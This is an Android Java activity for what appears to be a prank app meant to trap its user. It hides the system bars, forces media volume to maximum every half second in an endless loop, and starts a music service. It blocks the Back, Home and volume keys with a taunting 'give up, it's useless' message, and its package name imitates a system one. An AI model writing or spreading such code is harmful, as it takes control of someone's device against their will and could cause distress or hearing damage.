package com.android.opaotime;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.os.Build;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    public AudioManager am;
    //需要点击次数满足才会退出
    private int num = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //防止重新加载
        if (!this.isTaskRoot()) {
            Intent mainIntent = getIntent();
            String action = mainIntent.getAction();
            if (mainIntent.hasCategory(Intent.CATEGORY_LAUNCHER) && action.equals(Intent.ACTION_MAIN)) {
                finish();return;
            }}
        //隐藏状态栏标题栏及导航栏
        hideLaLayout();
        //获取音频服务
        am = (AudioManager)getSystemService(Context.AUDIO_SERVICE);
        //启动线程循环设置音量
        new Thread() {
            public void run() {
                //这儿是耗时操作，完成之后更新UI；
                while(true){
                    final int m = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
                    runOnUiThread(new Runnable(){
                        @Override
                        public void run() {
                            //更新UI
                            am.setStreamVolume(AudioManager.STREAM_MUSIC, m, AudioManager.FLAG_PLAY_SOUND);
                        }
                    });
                    try {
                        sleep(500);
                    } catch (InterruptedException e) {}
                }

            }
        }.start();
        //启动服务播放音乐
        final Intent intent = new Intent(getApplicationContext(),MusicService.class);
        startService(intent);
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if(keyCode== KeyEvent.KEYCODE_HOME|| keyCode == KeyEvent.KEYCODE_BACK || keyCode== KeyEvent.KEYCODE_VOLUME_DOWN || keyCode == KeyEvent.KEYCODE_VOLUME_UP){
            Toast toast = Toast.makeText(this,null, Toast.LENGTH_LONG);
            toast.setText("放弃吧，没用的！");
            toast.show();
            return true;
        }

        return super.onKeyDown(keyCode, event);
    }

    private void hideLaLayout(){
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                // 全屏显示，隐藏状态栏和导航栏，拉出状态栏和导航栏显示一会儿后消失。
                getWindow().getDecorView().setSystemUiVisibility(
                        View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                                | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                                | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                                | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                                | View.SYSTEM_UI_FLAG_FULLSCREEN
                                | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
            } else {
                // 全屏显示，隐藏状态栏
                getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_FULLSCREEN);
            }
        }
    }
}

